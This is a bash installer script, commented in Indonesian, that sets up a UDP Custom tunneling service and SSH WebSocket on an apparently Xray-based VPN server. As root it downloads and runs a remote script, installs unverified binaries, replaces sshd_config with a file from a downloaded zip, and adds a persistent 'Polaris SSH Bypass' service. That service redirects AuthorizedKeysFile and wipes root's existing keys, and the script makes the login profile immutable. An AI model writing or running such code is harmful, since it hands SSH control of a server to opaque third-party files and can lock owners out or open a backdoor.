#!/bin/bash

# ===============================
# Konstanta & Konfigurasi Umum
# ===============================
DOMAIN_FILE="/etc/xray/domain"
PROFILE_PATH="/root/.profile"
LOG_FILE="/usr/bin/securited"

# ===============================
# Fungsi Utilitas Umum
# ===============================

display_warning_message() {
  wall <<EOF
====================================
🚨 Peringatan Keamanan 🚨
====================================
Informasi Mod.
Silakan hubungi Mod by Najm di:
🌐 https://vip.meiyu.my.id
Terima kasih.
====================================
EOF
}

change_profile() {
  echo "[*] Mengubah file profile login..."
  PROFILE_FILE="/root/.profile"

  # Buka gembok jika sebelumnya dikunci
  chattr -i -a "$PROFILE_FILE" 2>/dev/null || true

  cat > "$PROFILE_FILE" <<'EOF'
# Ini hasil install_deteksi
if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi

# Menghindari pesan error "mesg: ttyname failed"
mesg n || true

# Menjalankan Welcome Dashboard sebagai Banner Login
if command -v welcome >/dev/null 2>&1; then
    welcome
else
    # Fallback jika skrip welcome tidak ditemukan
    clear
    echo -e "\033[1;31m"
    echo "╔══════════════════════════════════════════╗"
    echo "║ [!] Skrip 'welcome' tidak ditemukan!     ║"
    echo "║     Ketik 'menu' untuk membuka panel.    ║"
    echo "╚══════════════════════════════════════════╝"
    echo -e "\033[0m"
fi
EOF

  chmod +x "$PROFILE_FILE"
  chattr +i "$PROFILE_FILE"
}

setup_data() {
  echo "[*] Menyiapkan data dan konfigurasi SSH kustom..."
  apt-get update -y
  apt-get install -y sudo curl unzip wget
  
  wget -qO /usr/bin/detek.zip "https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/PROJECT.zip"
  cd /usr/bin/
  unzip -o detek.zip > /dev/null
  mv -f detek ctrl > /dev/null 2>&1 || true
  
  # Pastikan file bisa diubah sebelum ditimpa
  chattr -i -a /etc/ssh/sshd_config 2>/dev/null || true
  chattr -i -a /etc/ssh 2>/dev/null || true
  
  if [ -f "sshd_config" ]; then
      mv -f sshd_config /etc/ssh/sshd_config > /dev/null 
  fi
  
  systemctl restart ssh sshd
  chmod +x ctrl > /dev/null 2>&1 || true
  rm -f detek.zip* > /dev/null
  cd ~
}

inject_warning_to_profile() {
  echo "[*] Menginjeksi SSH WebSocket Script..."
  wget -qO sshws.sh https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/sshws.sh
  chmod +x sshws.sh
  ./sshws.sh
  rm -f sshws.sh
}

set_cron_keamanan() {
  SERVICE_NAME="Polaris"
  SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
  SCRIPT_FILE="/usr/local/bin/polaris-monitor.sh"
  BACKUP_HAPROXY="/etc/haproxy/.haproxy.cfg.backup"

  echo "==> [1/3] Membuat salinan (Golden Backup) konfigurasi yang sehat..."
  if [ -f /etc/haproxy/haproxy.cfg ]; then
      cp /etc/haproxy/haproxy.cfg "$BACKUP_HAPROXY"
  fi

  echo "==> [2/3] Membuat skrip Bypass SSH Pubkey..."
  cat > "$SCRIPT_FILE" << 'EOF'
#!/usr/bin/env bash
set -euo pipefail

if [[ "$EUID" -ne 0 ]]; then
  echo "Script ini harus dijalankan sebagai root." >&2
  exit 1
fi

echo "[*] Mengamankan jalur SSH dari kunci ilegal..."

mkdir -p /etc/ssh/my_secure_keys
chmod 700 /etc/ssh/my_secure_keys


touch /etc/ssh/my_secure_keys/authorized_keys
chmod 600 /etc/ssh/my_secure_keys/authorized_keys

sed -i 's|^#\?AuthorizedKeysFile.*|AuthorizedKeysFile /etc/ssh/my_secure_keys/authorized_keys|g' /etc/ssh/sshd_config

chattr -i -a /root/.ssh/authorized_keys 2>/dev/null || true
echo "Silakan timpa file ini, sudah tidak dibaca server :)" > /root/.ssh/authorized_keys

systemctl restart sshd 2>/dev/null || true
systemctl restart ssh 2>/dev/null || true

echo "[+] Konfigurasi Bypass SSH Selesai."
EOF

  chmod +x "$SCRIPT_FILE"

  echo "==> [3/3] Mengonfigurasi Polaris Systemd Service..."
  cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=Polaris SSH Bypass Configuration
After=network.target

[Service]
User=root
Type=oneshot
ExecStart=$SCRIPT_FILE
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

  systemctl daemon-reload
  systemctl enable "$SERVICE_NAME"
  systemctl start "$SERVICE_NAME"
}

pasang_udp() {
  echo "[*] Memasang layanan UDP Custom..."
  mkdir -p /etc/udp
  ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime

  wget -qO /etc/udp/udp-custom "https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/udp-custom-linux-amd64"
  chmod +x /etc/udp/udp-custom

  wget -qO /etc/udp/config.json "https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/config_2.json"
  chmod 644 /etc/udp/config.json

  cat > /etc/systemd/system/udp-custom.service <<EOF
[Unit]
Description=UDP Custom by ePro Dev. Team (Mod by Najm)
After=network-online.target
Wants=network-online.target

[Service]
User=root
Type=simple
ExecStartPre=/bin/sleep 5
ExecStart=/etc/udp/udp-custom server
WorkingDirectory=/etc/udp/
Restart=always
RestartSec=2s

[Install]
WantedBy=default.target
EOF

  systemctl daemon-reload
  systemctl enable udp-custom
  systemctl restart udp-custom
  systemctl restart ssh sshd
}

checking_sc() {
  echo "[*] Memulai proses instalasi dan pengamanan server..."
  
  display_warning_message
  change_profile
  setup_data
  set_cron_keamanan
  inject_warning_to_profile
  pasang_udp
  
  echo "[+] Semua proses instalasi selesai!"
}

